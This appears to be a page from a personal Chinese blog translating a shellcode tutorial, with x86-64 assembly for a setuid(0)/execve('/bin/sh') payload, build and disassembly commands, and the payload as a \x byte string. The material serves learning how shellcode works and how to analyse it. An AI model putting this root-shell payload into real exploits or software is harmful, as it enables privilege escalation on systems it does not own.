<h2 id="shellcode机理">shellcode机理</h2><p>shellcode通常用汇编写成。尽管有人能记住助记符表来直接写机器码，这并不适合初学者所以不推荐。</p>
<p>环境因子：</p>
<ul>
<li>许多应用和安全措施组件都部分过滤输入，限制指令集的可能。有时候这在覆盖返回地址时甚至都有影响。</li>
<li>操作系统对C API有不同的处理。通常(不是总是)linux上的shellcode依赖内核终端或者没链接的(unlinked)调用，而微软windows不提供中断API，shellcode必须利用PE解析来执行运行时链接。</li>
</ul>
<h2 id="汇编代码">汇编代码</h2><p>创建一个叫<code>test_shellcode.s</code>的文件</p>
<p>这个例子使用hatter的32字节 null-free payload，这个shellcode完成<code>setuid(0);execve(&#39;/bin/sh&#39;, null, null)</code>。拷贝以下代码到<code>test_shellcode.s</code>并保存。</p>
<pre><code><span class="built_in">BITS</span> <span class="number">64</span>
<span class="built_in">global</span> _start
<span class="label">start:</span>
    <span class="keyword">xor</span> <span class="literal">rdi</span>, <span class="literal">rdi</span>
    <span class="keyword">push</span> <span class="preprocessor">qword</span> <span class="number">0x69</span>
    <span class="keyword">pop</span> <span class="literal">rax</span>
    <span class="keyword">syscall</span>

    <span class="keyword">push</span> <span class="literal">rdi</span>
    <span class="keyword">push</span> <span class="literal">rdi</span>
    <span class="keyword">pop</span> <span class="literal">rsi</span>
    <span class="keyword">pop</span> <span class="literal">rdx</span>
    <span class="keyword">push</span> <span class="preprocessor">qword</span> <span class="number">0x68</span>
    <span class="keyword">mov</span> <span class="literal">rax</span>, <span class="preprocessor">qword</span> <span class="number">0x7361622f6e69622f</span>
    <span class="keyword">push</span> <span class="literal">rax</span>
    <span class="keyword">push</span> <span class="literal">rsp</span>
    <span class="keyword">pop</span> <span class="literal">rdi</span>
    <span class="keyword">push</span> <span class="preprocessor">qword</span> <span class="number">0x3b</span>
    <span class="keyword">pop</span> <span class="literal">rax</span>
    <span class="keyword">syscall</span>
</code></pre><p>我又是用nasm编译而不是gas。。。</p>
<pre><code>nasm <span class="built_in">test</span>_shellcode.s -o <span class="built_in">test</span>_shellcode.o
</code></pre><h2 id="提取shellcode">提取shellcode</h2><p>提取二进制字节码有许多方法，objdump可以(不过这时nasm生成的目标文件不包含二进制文件信息，所以要指定<code>nasm -felf64</code>这样生成包含符号表或者ELF文件头的文件), hexdump可以看。。。。。。不过译者喜欢用ndiasm，显然必须指定类型什么的。</p>
<pre><code> ~/Work/project/blackhat/shellcode  ndisasm -b64 -pamd test_shellcode.o
<span class="number">00000000</span>  <span class="number">4831F</span>F            xor rdi,rdi
<span class="number">00000003</span>  <span class="number">6</span>A69              push byte +<span class="number">0x69</span>
<span class="number">00000005</span>  <span class="number">58</span>                pop rax
<span class="number">00000006</span>  <span class="number">0F</span>05              syscall
<span class="number">00000008</span>  <span class="number">57</span>                push rdi
<span class="number">00000009</span>  <span class="number">57</span>                push rdi
<span class="number">0000000</span>A  <span class="number">5</span>E                pop rsi
<span class="number">0000000</span>B  <span class="number">5</span>A                pop rdx
<span class="number">0000000</span>C  <span class="number">6</span>A68              push byte +<span class="number">0x68</span>
<span class="number">0000000</span>E  <span class="number">48</span>B82F62696E2F62  mov rax,<span class="number">0x7361622f6e69622f</span>
         -<span class="number">6173</span>
<span class="number">00000018</span>  <span class="number">50</span>                push rax
<span class="number">00000019</span>  <span class="number">54</span>                push rsp
<span class="number">0000001</span>A  <span class="number">5F</span>                pop rdi
<span class="number">0000001</span>B  <span class="number">6</span>A3B              push byte +<span class="number">0x3b</span>
<span class="number">0000001</span>D  <span class="number">58</span>                pop rax
<span class="number">0000001</span>E  <span class="number">0F</span>05              syscall
</code></pre><p>中间部分包含指定汇编的字节指令。大多数调试器也展示对应汇编代码的十六进制记法。</p>
<pre><code> <span class="special">~</span>/Work/project/blackhat/shellcode  od -t x1 test_shellcode.o | awk '<span class="special">{</span><span class="formula">$1=""; print<span class="special">}</span>'|sed 'N;s/<span class="command">\n</span>//g;s/ /<span class="command">\\</span>x/g' 
<span class="command">\x</span>48<span class="command">\x</span>31<span class="command">\xff</span><span class="command">\x</span>6a<span class="command">\x</span>69<span class="command">\x</span>58<span class="command">\x</span>0f<span class="command">\x</span>05<span class="command">\x</span>57<span class="command">\x</span>57<span class="command">\x</span>5e<span class="command">\x</span>5a<span class="command">\x</span>6a<span class="command">\x</span>68<span class="command">\x</span>48<span class="command">\xb</span>8<span class="command">\x</span>2f<span class="command">\x</span>62<span class="command">\x</span>69<span class="command">\x</span>6e<span class="command">\x</span>2f<span class="command">\x</span>62<span class="command">\x</span>61<span class="command">\x</span>73<span class="command">\x</span>50<span class="command">\x</span>54<span class="command">\x</span>5f<span class="command">\x</span>6a<span class="command">\x</span>3b<span class="command">\x</span>58<span class="command">\x</span>0f<span class="command">\x</span>05</span>
</code></pre><h3 id="shellcode反汇编">shellcode反汇编</h3><p>许多次你看到来自‘野外的’shellcode，例如分析恶意软件和新的exploit，这时你需要反汇编shellcode来学习。最简单的方式是使用objdump(还是习惯ndiasm，呵呵)本例我们使用我们构建的实例。</p>
<p>就是这么简单：</p>
<pre><code> ~/Work/project/blackhat/shellcode   echo -en <span class="string">"\x48\x31\xff\x6a\x69\x58\x0f\x05\x57\x57\x5e\x5a\x48\xbf\x6a\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05"</span> &gt; shellcode ; ndisasm -b64 -pamd shellcode      
<span class="number">00000000</span>  <span class="number">4831F</span>F            xor rdi,rdi
<span class="number">00000003</span>  <span class="number">6</span>A69              push byte +<span class="number">0x69</span>
<span class="number">00000005</span>  <span class="number">58</span>                pop rax
<span class="number">00000006</span>  <span class="number">0F</span>05              syscall
<span class="number">00000008</span>  <span class="number">57</span>                push rdi
<span class="number">00000009</span>  <span class="number">57</span>                push rdi
<span class="number">0000000</span>A  <span class="number">5</span>E                pop rsi
<span class="number">0000000</span>B  <span class="number">5</span>A                pop rdx
<span class="number">0000000</span>C  <span class="number">48</span>BF6A2F62696E2F  mov rdi,<span class="number">0x68732f6e69622f6a</span>
         -<span class="number">7368</span>
<span class="number">00000016</span>  <span class="number">48</span>C1EF08          shr rdi,byte <span class="number">0x8</span>
<span class="number">0000001</span>A  <span class="number">57</span>                push rdi
<span class="number">0000001</span>B  <span class="number">54</span>                push rsp
<span class="number">0000001</span>C  <span class="number">5F</span>                pop rdi
<span class="number">0000001</span>D  <span class="number">6</span>A3B              push byte +<span class="number">0x3b</span>
<span class="number">0000001F</span>  <span class="number">58</span>                pop rax
<span class="number">00000020</span>  <span class="number">0F</span>05              syscall
</code></pre>
            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    

  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/18/">18</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right"></i></a>
  </nav>



        </div>

        


        

      </div>

      
        
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      

      <section class="site-overview sidebar-panel  sidebar-panel-active ">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" src="/images/default_avatar.jpg" alt="Liu Yuyang" itemprop="image"/>
          <p class="site-author-name" itemprop="name">Liu Yuyang</p>
        </div>
        <p class="site-description motion-element" itemprop="description">我希望生活是诗的，是画的，是无数动听的音符。我希望我是自由的，摇滚的，有一颗黑客的心。</p>
        <nav class="site-state motion-element">
          <div class="site-state-item site-state-posts">
            <a href="/archives">
              <span class="site-state-item-count">174</span>
              <span class="site-state-item-name">日志</span>
            </a>
          </div>

          <div class="site-state-item site-state-categories">
            <a href="/categories">
              <span class="site-state-item-count">23</span>
              <span class="site-state-item-name">分类</span>
              </a>
          </div>

          <div class="site-state-item site-state-tags">
            <a href="/tags">
              <span class="site-state-item-count">60</span>
              <span class="site-state-item-name">标签</span>
              </a>
          </div>

        </nav>

        
          <div class="feed-link motion-element">
            <a href="/atom.xml" rel="alternate">
              <i class="fa fa-rss"></i>
              RSS
            </a>
          </div>
        

        <div class="links-of-author motion-element">
          
            
              <span class="links-of-author-item">
                <a href="https://github.com/reverland" target="_blank">
                  
                    <i class="fa fa-github"></i> GitHub
                  
                </a>
              </span>
            
          
        </div>

        
        

        <div class="links-of-author motion-element">
          
            <p class="site-author-name">Links</p>
            
              <span class="links-of-author-item">
                <a href="http://reverland.bitbucket.org/" target="_blank">曾经的的vimwiki</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://liutos.github.com/" target="_blank">Liutos</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://blog.phoenixlzx.com/" target="_blank">凤凰君</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://gndrive.org/" target="_blank">高达数字实验室</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://www.cherrot.com/" target="_blank">Cherrot</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://xwyam.github.com/" target="_blank">xw_y_am</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://ishell.me" target="_blank">小东</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://blog.kochiya.me/" target="_blank">AS酱</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://blog.skydark.info/" target="_blank">skydark</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://thorb.cn/" target="_blank">thorb</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://www.suzibin.cn/" target="_blank">doug</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://armsword.com/" target="_blank">armsword</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://zhangwenli.com/blog" target="_blank">Ovilia</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://lilydjwg.is-programmer.com/" target="_blank">仙子</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://gaohaoyang.github.io" target="_blank">HYG</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://simmer-jun.github.io" target="_blank">Simmer</a>
              </span>
            
          
        </div>

      </section>

      

    </div>
  </aside>


      
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright" >
  
  &copy;  2011 - 
  <span itemprop="copyrightYear">2015</span>
  <span class="with-love">
    <i class="icon-next-heart fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Liu Yuyang</span>
</div>

<div class="powered-by">
  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 强力驱动
</div>

<div class="theme-info">
  主题 -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT
  </a>
</div>



      </div>
    </footer>

    <div class="back-to-top"></div>
  </div>

  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>

  
  

  
    
    

  

    <script type="text/javascript">
      var disqus_shortname = 'reverlandblog';
      var disqus_identifier = 'page/3/index.html';
      var disqus_title = '';
      var disqus_url = '';

      function run_disqus_script(disqus_script){
        var dsq = document.createElement('script');
        dsq.type = 'text/javascript';
        dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
      }

      run_disqus_script('count.js');
      
    </script>
  


  

  
  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
  <script type="text/javascript" src="/js/fancy-box.js?v=0.4.5.2"></script>


  <script type="text/javascript" src="/js/helpers.js?v=0.4.5.2"></script>
  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
<script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>

<script type="text/javascript" src="/js/motion.js?v=0.4.5.2" id="motion.global"></script>


  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  

  <script type="text/javascript" src="/js/bootstrap.js"></script>

  
  
  <script type="text/x-mathjax-config">
    MathJax.Hub.Config({
      tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
    });
  </script>

  <script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
      var all = MathJax.Hub.getAllJax(), i;
      for (i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';
      }
    });
  </script>

  
    <script type="text/javascript" src="http://cdn.staticfile.org/mathjax/2.4.0/MathJax.js"></script>
    <script type="text/javascript" src="http://cdn.staticfile.org/mathjax/2.4.0/config/TeX-AMS-MML_HTMLorMML.js"></script>
  


  
  

</body>
</html>
